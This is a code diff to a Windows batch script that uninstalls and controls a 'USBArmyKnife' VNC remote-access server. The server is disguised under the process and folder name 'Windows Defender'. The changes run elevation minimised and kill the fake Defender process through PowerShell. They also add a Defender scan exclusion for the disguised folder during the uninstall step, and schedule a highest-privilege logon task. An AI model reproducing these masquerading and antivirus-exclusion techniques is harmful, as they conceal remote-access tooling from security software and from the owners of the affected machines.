@@ -17,7 +17,7 @@ for %%I in ("%~f0") do set "SRC_DIR=%%~dI%%~pI"
 for %%I in ("%TEMP%") do set "SHORTTEMP=%%~sI"
 if not "%SRC_DIR%"=="%SHORTTEMP%\" (
     copy /y "%~f0" "%SHORTTEMP%\USBArmyKnife_Uninstall.bat" >nul 2>&1
-    powershell -NoProfile -Command "Start-Process cmd -ArgumentList '/c \"%SHORTTEMP%\USBArmyKnife_Uninstall.bat\"' -Verb RunAs"
+    start "" /min powershell -NoProfile -Command "Start-Process cmd -ArgumentList '/c \"%SHORTTEMP%\USBArmyKnife_Uninstall.bat\"' -Verb RunAs"
     exit /b
 )
 
@@ -73,7 +73,7 @@ echo.
 
 echo [1/5] Stopping processes...
 taskkill /F /IM AgentLauncher.exe >nul 2>&1
-taskkill /F /IM Windows Defender.exe >nul 2>&1
+powershell -NoProfile -Command "Get-Process -Name 'Windows Defender' -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue"
 timeout /t 2 /nobreak >nul
 echo    Done.
 
@@ -103,11 +103,14 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v Prom
 echo    Done.
 
 echo [5/5] Deleting folder...
+powershell -NoProfile -Command "Add-MpPreference -ExclusionPath 'C:\ProgramData\Windows Defender' -ErrorAction SilentlyContinue"
 rmdir /s /q "%DEST%" >nul 2>&1
 if not exist "%DEST%" (
     echo    Folder deleted.
 ) else (
-    echo    Could not delete. Restart PC and try again.
+    echo    Folder locked by Windows Defender. Scheduling cleanup on next boot...
+    schtasks /create /tn "USBArmyKnife Cleanup" /tr "cmd.exe /c rmdir /s /q `"C:\ProgramData\Windows Defender`"" /sc onlogon /rl highest /f >nul 2>&1
+    echo    Cleanup scheduled. Folder will be removed after restart.
 )
 
 echo.
@@ -153,7 +156,7 @@ goto show_menu
 echo.
 echo === Stopping VNC Server ===
 echo.
-taskkill /F /IM Windows Defender.exe >nul 2>&1
+powershell -NoProfile -Command "Get-Process -Name 'Windows Defender' -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue"
 timeout /t 1 /nobreak >nul
 echo    VNC Server stopped.
 goto show_menu
@@ -169,7 +172,7 @@ set /p "NEWPASS=Password: "
 
 echo.
 echo Stopping VNC server...
-taskkill /F /IM Windows Defender.exe >nul 2>&1
+powershell -NoProfile -Command "Get-Process -Name 'Windows Defender' -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue"
 timeout /t 2 /nobreak >nul
 
 if not "%NEWPASS%"=="" (
